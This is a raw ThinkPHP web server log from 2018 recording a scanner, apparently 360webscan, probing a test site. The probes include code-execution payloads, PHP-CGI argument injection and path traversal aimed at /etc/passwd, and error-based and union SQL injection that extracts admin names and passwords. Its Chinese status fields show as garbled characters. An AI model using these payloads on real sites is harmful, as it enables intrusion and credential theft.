[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:34+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.093582s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:36+08:00 ] 220.181.55.144 GET /?s=abc~abc~abc~$%7B@print(md5(base64_decode(MzYwd2Vic2Nhbg)))%7D
[ info ] xszzglzx.w133-e1.ezwebtest.com/?s=abc~abc~abc~$%7B@print(md5(base64_decode(MzYwd2Vic2Nhbg)))%7D [Х©░Х║▄Ф≈╤И≈╢О╪ 1.077959s][Е░·Е░░Г▌┤О╪ 0.93req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.45kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:36+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.124827s][Е░·Е░░Г▌┤О╪ 0.89req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:39+08:00 ] 220.181.55.144 GET /?s=/abc/abc/abc/$%7B@print(md5(base64_decode(MzYwd2Vic2Nhbg)))%7D/
[ info ] xszzglzx.w133-e1.ezwebtest.com/?s=/abc/abc/abc/$%7B@print(md5(base64_decode(MzYwd2Vic2Nhbg)))%7D/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.101394s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.32kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:42+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.046715s][Е░·Е░░Г▌┤О╪ 0.96req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:43+08:00 ] 220.181.55.144 GET /?user-getpass-1'
[ info ] xszzglzx.w133-e1.ezwebtest.com/?user-getpass-1' [Х©░Х║▄Ф≈╤И≈╢О╪ 1.109205s][Е░·Е░░Г▌┤О╪ 0.90req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.10kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:45+08:00 ] 220.181.55.144 GET /?user-space-1'
[ info ] xszzglzx.w133-e1.ezwebtest.com/?user-space-1' [Х©░Х║▄Ф≈╤И≈╢О╪ 1.101393s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.12kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:46+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.101393s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:47+08:00 ] 220.181.55.144 POST /index.php
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php [Х©░Х║▄Ф≈╤И≈╢О╪ 1.109204s][Е░·Е░░Г▌┤О╪ 0.90req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.04kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:48+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.171695s][Е░·Е░░Г▌┤О╪ 0.85req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:51+08:00 ] 220.181.55.144 POST /index.php?user-getpass
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?user-getpass [Х©░Х║▄Ф≈╤И≈╢О╪ 1.335732s][Е░·Е░░Г▌┤О╪ 0.75req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.15kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:55+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.070149s][Е░·Е░░Г▌┤О╪ 0.93req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:57+08:00 ] 220.181.55.144 GET /index.php?-dauto_prepend_file%3d/etc/passwd+-n
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?-dauto_prepend_file%3d/etc/passwd+-n [Х©░Х║▄Ф≈╤И≈╢О╪ 1.101394s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.26kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:04+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.085771s][Е░·Е░░Г▌┤О╪ 0.92req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:06+08:00 ] 220.181.55.144 POST /?product-gnotify
[ info ] xszzglzx.w133-e1.ezwebtest.com/?product-gnotify [Х©░Х║▄Ф≈╤И≈╢О╪ 1.093582s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.02kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:10+08:00 ] 220.181.55.144 POST /index.php
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php [Х©░Х║▄Ф≈╤И≈╢О╪ 1.093582s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.98kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:12+08:00 ] 220.181.55.144 POST /index.php/api/xmlrpc
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php/api/xmlrpc [Х©░Х║▄Ф≈╤И≈╢О╪ 1.195129s][Е░·Е░░Г▌┤О╪ 0.84req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,201.63kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:13+08:00 ] 220.181.55.144 POST /index.php
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php [Х©░Х║▄Ф≈╤И≈╢О╪ 1.117016s][Е░·Е░░Г▌┤О╪ 0.90req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.98kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:16+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.093582s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.07kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:17+08:00 ] 220.181.55.144 GET /index.php?option=com_hello&controller=../../../../../../../../etc/passwd%00
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?option=com_hello&controller=../../../../../../../../etc/passwd%00 [Х©░Х║▄Ф≈╤И≈╢О╪ 1.070148s][Е░·Е░░Г▌┤О╪ 0.93req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.32kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:19+08:00 ] 220.181.55.144 GET /index.php?m=search&a=public_get_suggest_keyword&url=http://www.baidu.com/&q=/../robots.txt
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?m=search&a=public_get_suggest_keyword&url=http://www.baidu.com/&q=/../robots.txt [Х©░Х║▄Ф≈╤И≈╢О╪ 1.062337s][Е░·Е░░Г▌┤О╪ 0.94req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.34kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:19+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.109205s][Е░·Е░░Г▌┤О╪ 0.90req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:22+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.031091s][Е░·Е░░Г▌┤О╪ 0.97req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:24+08:00 ] 220.181.55.144 GET /index.php?a=list_type&c=index&m=link&siteid=1'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1122),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a);%23
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?a=list_type&c=index&m=link&siteid=1'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1122),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a);%23 [Х©░Х║▄Ф≈╤И≈╢О╪ 1.085771s][Е░·Е░░Г▌┤О╪ 0.92req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.48kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:26+08:00 ] 220.181.55.144 GET /index.php?ac=search&at=taglist&tagkey=%2527,tags)%20or(select%201%20from(select%20count(*),concat((select%20(select%20concat(0x7e,0x27,table_name,0x27,0x7e))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?ac=search&at=taglist&tagkey=%2527,tags)%20or(select%201%20from(select%20count(*),concat((select%20(select%20concat(0x7e,0x27,table_name,0x27,0x7e))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23 [Х©░Х║▄Ф≈╤И≈╢О╪ 1.171695s][Е░·Е░░Г▌┤О╪ 0.85req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.45kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:28+08:00 ] 220.181.55.144 GET /?/home/explore/category-1)%20AND%20(SELECT%204037%20FROM(SELECT%20COUNT(*),CONCAT(CHAR(58,100,114,108,58),(SELECT%20(CASE%20WHEN%20(4037=4037)%20THEN%201%20ELSE%200%20END)),CHAR(58,122,103,111,58),FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)%20AND%20(9909=9909
[ info ] xszzglzx.w133-e1.ezwebtest.com/?/home/explore/category-1)%20AND%20(SELECT%204037%20FROM(SELECT%20COUNT(*),CONCAT(CHAR(58,100,114,108,58),(SELECT%20(CASE%20WHEN%20(4037=4037)%20THEN%201%20ELSE%200%20END)),CHAR(58,122,103,111,58),FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)%20AND%20(9909=9909 [Х©░Х║▄Ф≈╤И≈╢О╪ 1.062337s][Е░·Е░░Г▌┤О╪ 0.94req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.46kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:41+08:00 ] 220.181.55.144 GET /?/people/360webscan?notification_id-360webscan'
[ info ] xszzglzx.w133-e1.ezwebtest.com/?/people/360webscan?notification_id-360webscan' [Х©░Х║▄Ф≈╤И≈╢О╪ 1.562260s][Е░·Е░░Г▌┤О╪ 0.64req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.17kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:43+08:00 ] 220.181.55.144 GET /?tag=test'%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(sha1('360webscan'),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20'1'='1
[ info ] xszzglzx.w133-e1.ezwebtest.com/?tag=test'%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(sha1('360webscan'),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20'1'='1 [Х©░Х║▄Ф≈╤И≈╢О╪ 1.070148s][Е░·Е░░Г▌┤О╪ 0.93req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.25kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:48+08:00 ] 220.181.55.144 GET /index.php?m=poster&c=index&a=poster_click&id=1
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?m=poster&c=index&a=poster_click&id=1 [Х©░Х║▄Ф≈╤И≈╢О╪ 1.038903s][Е░·Е░░Г▌┤О╪ 0.96req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.31kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:51+08:00 ] 220.181.55.144 GET /?/people/ajax/user_actions/uid-1__actions-1)%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(sha1(0x3336307765627363616e),(SELECT%20(CASE%20WHEN%20(8274=8274)%20THEN%201%20ELSE%200%20END)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20and%20(1=1
[ info ] xszzglzx.w133-e1.ezwebtest.com/?/people/ajax/user_actions/uid-1__actions-1)%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(sha1(0x3336307765627363616e),(SELECT%20(CASE%20WHEN%20(8274=8274)%20THEN%201%20ELSE%200%20END)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20and%20(1=1 [Х©░Х║▄Ф≈╤И≈╢О╪ 1.140450s][Е░·Е░░Г▌┤О╪ 0.88req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.52kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:37:53+08:00 ] 220.181.55.144 GET /index.php?option=com_ztautolink&controller=../../../../../../../../../../../../../../../etc/passwd%00
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?option=com_ztautolink&controller=../../../../../../../../../../../../../../../etc/passwd%00 [Х©░Х║▄Ф≈╤И≈╢О╪ 1.077959s][Е░·Е░░Г▌┤О╪ 0.93req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.15kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:38:17+08:00 ] 220.181.55.144 GET /index.php?ac=search&at=taglist&tagkey=a%2527
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?ac=search&at=taglist&tagkey=a%2527 [Х©░Х║▄Ф≈╤И≈╢О╪ 1.124827s][Е░·Е░░Г▌┤О╪ 0.89req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.27kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:38:22+08:00 ] 220.181.55.144 POST /?cart-ajaxadd
[ info ] xszzglzx.w133-e1.ezwebtest.com/?cart-ajaxadd [Х©░Х║▄Ф≈╤И≈╢О╪ 1.070149s][Е░·Е░░Г▌┤О╪ 0.93req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.88kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:38:25+08:00 ] 220.181.55.144 GET /index.php?ac=order&at=list
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?ac=order&at=list [Х©░Х║▄Ф≈╤И≈╢О╪ 1.117016s][Е░·Е░░Г▌┤О╪ 0.90req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.26kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:43:12+08:00 ] 220.181.55.144 POST /index.php?act=ajax&do=datacall&in_ajax=1&m=index&op=get_datacall
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?act=ajax&do=datacall&in_ajax=1&m=index&op=get_datacall [Х©░Х║▄Ф≈╤И≈╢О╪ 1.156072s][Е░·Е░░Г▌┤О╪ 0.86req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.30kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:43:14+08:00 ] 220.181.55.144 GET /index.php/product/list?keyword=kn1f3'+union+select+1,2,3,4,5,(select+concat(0x7c,admin_name,0x7c,admin_pw,0x7c,sha1(0x3336307765627363616e))+from+pe_admin),7,8,9,10,11,12,13,14,15,16,17,18,19%20and+'1'='1
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php/product/list?keyword=kn1f3'+union+select+1,2,3,4,5,(select+concat(0x7c,admin_name,0x7c,admin_pw,0x7c,sha1(0x3336307765627363616e))+from+pe_admin),7,8,9,10,11,12,13,14,15,16,17,18,19%20and+'1'='1 [Х©░Х║▄Ф≈╤И≈╢О╪ 1.093582s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,201.97kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:43:23+08:00 ] 220.181.55.144 POST /?cart-addGoodsToCart.html
[ info ] xszzglzx.w133-e1.ezwebtest.com/?cart-addGoodsToCart.html [Х©░Х║▄Ф≈╤И≈╢О╪ 1.140450s][Е░·Е░░Г▌┤О╪ 0.88req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.90kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:43:26+08:00 ] 220.181.55.144 GET /index.php?controller=block&action=spec_value_list&id=1%20union%20select%201,%28Select%20concat%280x5b,admin_name,0x3a,PassWord,0x5d%29%29,3,4,5,6%20from%20iwebshop_admin
